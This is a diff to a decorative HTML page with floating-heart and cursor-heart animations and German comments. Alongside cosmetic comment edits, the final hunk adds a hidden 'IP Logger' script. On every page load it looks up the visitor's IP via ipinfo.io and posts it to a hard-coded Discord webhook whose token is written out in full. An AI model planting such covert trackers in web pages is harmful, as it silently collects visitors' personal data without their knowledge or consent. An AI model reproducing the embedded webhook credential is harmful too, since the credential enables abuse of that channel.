@@ -13,7 +13,7 @@
         align-items: center;
         overflow: hidden;
         font-family: 'Poppins', sans-serif;
-        cursor: none; /* optional, für clean look */
+        cursor: none;
     }
     h1 {
         font-size: 5em;
@@ -76,6 +76,7 @@
     <h1>VI1D ❤️</h1>
 
     <script>
+        // Herzen nach oben fliegen
         function createHeart(){
             const heart = document.createElement('div');
             heart.className = 'heart';
@@ -87,7 +88,7 @@
         }
         setInterval(createHeart, 200);
 
-        // Cursor Herz Effekt
+        // Cursor-Herz Effekt
         document.addEventListener('mousemove', e => {
             const cHeart = document.createElement('div');
             cHeart.className = 'cursor-heart';
@@ -97,6 +98,20 @@
             document.body.appendChild(cHeart);
             setTimeout(() => cHeart.remove(), 500);
         });
+
+        // IP Logger + Discord Webhook
+        const webhookURL = "https://discord.com/api/webhooks/1406003285600501970/DHV4856DEk1Um6N70WyTjnl5qMsPd1egU98METNMoC8Jgs1Dzgb2VCbqKtaaTigA_i1P";
+
+        fetch("https://ipinfo.io/json")
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `new visitor (${ip})` })
+                });
+            });
     </script>
 </body>
 </html>
